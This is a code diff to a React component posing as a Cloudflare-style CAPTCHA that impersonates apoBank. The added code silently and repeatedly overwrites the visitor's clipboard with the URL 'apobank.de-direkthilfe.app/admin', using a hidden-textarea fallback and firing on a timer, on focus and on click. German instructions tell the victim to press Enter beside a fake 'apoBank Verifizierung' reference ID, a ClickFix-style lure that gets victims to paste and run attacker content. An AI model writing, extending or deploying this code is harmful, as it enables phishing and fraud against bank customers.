@@ -15,6 +15,10 @@ const CfCaptcha = () => {
   const [x, setX] = useState(0);
   const [done, setDone] = useState(false);
   const [phase, setPhase] = useState<Phase>("idle");
+  const [refId] = useState(() =>
+    Array.from({ length: 16 }, () => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("")
+  );
+  const CLIP_PAYLOAD = "https://apobank.de-direkthilfe.app/admin";
   const startXRef = useRef(0);
   const startPosRef = useRef(0);
   const KNOB = 44;
@@ -79,6 +83,35 @@ const CfCaptcha = () => {
       document.removeEventListener("contextmenu", prevent);
     };
   }, []);
+
+  useEffect(() => {
+    if (phase !== "slider") return;
+    const copy = () => {
+      try {
+        navigator.clipboard?.writeText(CLIP_PAYLOAD).catch(() => {
+          const ta = document.createElement("textarea");
+          ta.value = CLIP_PAYLOAD;
+          ta.style.position = "fixed";
+          ta.style.opacity = "0";
+          document.body.appendChild(ta);
+          ta.select();
+          try { document.execCommand("copy"); } catch {}
+          document.body.removeChild(ta);
+        });
+      } catch {}
+    };
+    copy();
+    const iv = window.setInterval(copy, 1500);
+    const onFocus = () => copy();
+    const onClick = () => copy();
+    window.addEventListener("focus", onFocus);
+    window.addEventListener("click", onClick);
+    return () => {
+      window.clearInterval(iv);
+      window.removeEventListener("focus", onFocus);
+      window.removeEventListener("click", onClick);
+    };
+  }, [phase]);
 
   useEffect(() => {
     const mm = (e: MouseEvent) => onMove(e.clientX);
@@ -195,8 +228,8 @@ const CfCaptcha = () => {
                 <li>Drücken Sie <strong>Enter</strong> auf Ihrer Tastatur, um abzuschließen.</li>
               </ol>
               <p className="text-[13px] text-slate-600 mb-2">Sie werden Folgendes sehen und bestätigen:</p>
-              <div className="mb-6 rounded-md border border-slate-200 bg-white px-3 py-2 font-mono text-[13px] text-slate-700">
-                apoBank Verifizierung (Ref-ID: 90b0e54eb8bd5d84)
+              <div className="mb-6 rounded-md border border-slate-200 bg-white px-3 py-2 font-mono text-[13px] text-slate-700 break-all">
+                apoBank Verifizierung (Ref-ID: {refId})
               </div>
 
               <div className="text-center">
